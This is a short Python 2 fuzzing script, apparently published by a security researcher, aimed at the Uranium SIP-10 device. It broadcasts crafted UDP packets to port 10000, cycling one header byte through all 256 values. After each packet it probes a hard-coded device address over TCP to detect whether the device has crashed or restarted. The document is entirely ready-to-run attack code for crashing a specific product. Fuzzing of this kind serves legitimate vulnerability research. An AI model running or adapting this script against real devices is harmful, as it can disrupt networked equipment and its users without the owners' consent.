# Uranium SIP-10 Fuzzer
# Product URL: http://www.uranium.com.tr/sip10b.html
# Author: Mert SARICA
# E-mail: mert [ . ] sarica [ @ ] gmail [ . ] com
# URL: http://www.mertsarica.com

import socket
import time
import os
import sys

os.system("cls")
        
print "================================================="
print u"Uranium SIP-10 Fuzzer [http://www.mertsarica.com]"
print "================================================="
    
IPADDR = '255.255.255.255' # Broadcast address
PORTNUM = 10000 # SIP-10 UDP Port

# UDP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', 62010)) # Source port

s.connect((IPADDR, PORTNUM))

i = 0

while i <= 255:
    t = "%02x" % i
    print "Fuzzing Byte: %02x" % i
    # Packet:        4d4f5f49   02    00000000000000000000400000000000000000000001373841354444303644304141006d65727473617269636100000031323334353600000000000000c0a8014affffff00c0a80101c0a80101fde8000000
    PACKETDATA =   ('4d4f5f49' + t + '00000000000000000000400000000000000000000001373841354444303644304141006d65727473617269636100000031323334353600000000000000c0a8014affffff00c0a80101c0a80101fde8000000').decode('hex')
    
    s.send(PACKETDATA)
    time.sleep (10);
    
    m = socket.socket()     
    host = '192.168.1.74'     # SIP-10 IP Address
    port = 65000              # SIP-10 TCP Destination Port   
    try:
        m.connect((host, port))
    except:
        print "SIP-10 is crashed or restarted! (Byte: %s)" % t
        sys.exit(1)

    i = i + 1

    m.close

    
s.close()

